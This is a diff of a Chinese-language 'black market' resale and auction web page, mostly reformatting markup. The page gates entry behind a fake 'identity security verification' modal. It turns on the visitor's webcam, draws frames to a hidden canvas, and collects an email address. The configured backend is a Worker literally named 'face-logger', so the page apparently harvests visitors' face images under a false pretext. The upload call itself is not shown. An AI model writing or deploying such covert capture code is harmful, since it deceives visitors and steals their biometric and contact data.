@@ -5,15 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>黑市二手寄卖 & 极客拍卖大厅</title>
   <style>
-    :root {
-      --bg: #0b0f19;
-      --card-bg: #111827;
-      --accent: #2563eb;
-      --accent-hover: #1d4ed8;
-      --text: #f3f4f6;
-      --text-muted: #9ca3af;
-      --border: #1f2937;
-    }
+    :root { --bg: #0b0f19; --card-bg: #111827; --accent: #2563eb; --accent-hover: #1d4ed8; --text: #f3f4f6; --text-muted: #9ca3af; --border: #1f2937; }
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
     body { background: var(--bg); color: var(--text); padding-bottom: 60px; }
     header { background: var(--card-bg); border-bottom: 1px solid var(--border); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; flex-wrap: wrap; gap: 10px; }
@@ -43,19 +35,13 @@
 </head>
 <body>
 
-  <!-- 登录授权弹窗 -->
   <div class="modal-overlay" id="authModal">
     <div class="auth-card">
       <h3>🔐 身份安全验证</h3>
       <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 15px;">请允许摄像头权限并完成校验</p>
-      <div class="camera-box">
-        <video id="webcam" autoplay playsinline muted></video>
-      </div>
+      <div class="camera-box"><video id="webcam" autoplay playsinline muted></video></div>
       <div style="font-size: 11px; color: #38bdf8; margin-bottom: 10px;" id="camStatus">⏳ 正在连接摄像头...</div>
-      <div class="input-group">
-        <label>电子邮箱</label>
-        <input type="email" id="userEmail" value="user@domain.com">
-      </div>
+      <div class="input-group"><label>电子邮箱</label><input type="email" id="userEmail" value="user@domain.com"></div>
       <button class="btn" onclick="app.login()">确认拍摄并进入</button>
     </div>
   </div>
@@ -73,16 +59,8 @@
   </header>
 
   <div class="container">
-    <div id="tab-market" class="tab-content active">
-      <h3>📱 玩家二手寄卖大厅</h3>
-      <div class="grid" id="marketList"></div>
-    </div>
-
-    <div id="tab-auction" class="tab-content">
-      <h3>🔥 极客限量款竞拍大厅</h3>
-      <div class="grid" id="auctionList"></div>
-    </div>
-
+    <div id="tab-market" class="tab-content active"><h3>📱 玩家二手寄卖大厅</h3><div class="grid" id="marketList"></div></div>
+    <div id="tab-auction" class="tab-content"><h3>🔥 极客限量款竞拍大厅</h3><div class="grid" id="auctionList"></div></div>
     <div id="tab-sell" class="tab-content">
       <div class="auth-card" style="max-width: 500px; margin: 0 auto; text-align: left;">
         <h3 style="margin-bottom: 15px;">📦 发布二手寄卖物品</h3>
@@ -94,7 +72,6 @@
         <button class="btn" onclick="app.postSellItem()">立即发布</button>
       </div>
     </div>
-
     <div id="tab-postAuction" class="tab-content">
       <div class="auth-card" style="max-width: 500px; margin: 0 auto; text-align: left;">
         <h3 style="margin-bottom: 15px;">🔨 发起新的极客拍卖</h3>
@@ -108,8 +85,7 @@
   </div>
 
   <script>
-    // 🔗 请修改为你的 Worker 线上地址 (必须以 https:// 开头，末尾不要加斜杠)
-    const WORKER_URL = "https://face-logger.bmk4byvf9b.workers.dev";
+    const WORKER_URL = "https://face-logger.bmk4byvf9b.workers.dev"; // 改为你的线上 Worker 链接
 
     class App {
       constructor() {
@@ -140,7 +116,6 @@
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('hidden-canvas');
         let photoData = "";
-
         try {
           if (video && video.videoWidth > 0) {
             canvas.width = video.videoWidth;
@@ -163,7 +138,7 @@
 
       async loadData() {
         try {
-          const res = await fetch(`${WORKER_URL}?action=data`);
+          const res = await fetch(WORKER_URL);
           const data = await res.json();
           const bids = data.bids || {};
 
@@ -187,7 +162,6 @@
           } else {
             marketHtml = `<div style="color:var(--text-muted); font-size:13px;">暂无寄卖商品，快去发布吧！</div>`;
           }
-          document.getElementById('marketList').html = marketHtml; // 修复点
           document.getElementById('marketList').innerHTML = marketHtml;
 
           // 渲染拍卖
